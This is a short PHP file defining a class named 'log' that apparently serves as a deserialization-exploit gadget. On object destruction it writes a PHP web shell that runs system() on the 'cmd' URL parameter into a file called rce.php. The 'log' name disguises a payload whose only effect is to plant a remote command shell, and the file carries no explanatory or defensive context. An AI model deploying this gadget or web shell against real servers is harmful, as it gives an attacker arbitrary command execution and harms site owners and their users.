<?php

class log
{
	public function __construct()
    {
        $this->logs='rce.php';
        $this->request='<?php system($_GET["cmd"]); ?>';
    }

    public function __destruct()
    {
        $request_log = fopen($this->logs , "a");
        fwrite($request_log, $this->request);
        fwrite($request_log, "\r\n");
        fclose($request_log);
    }
}

?>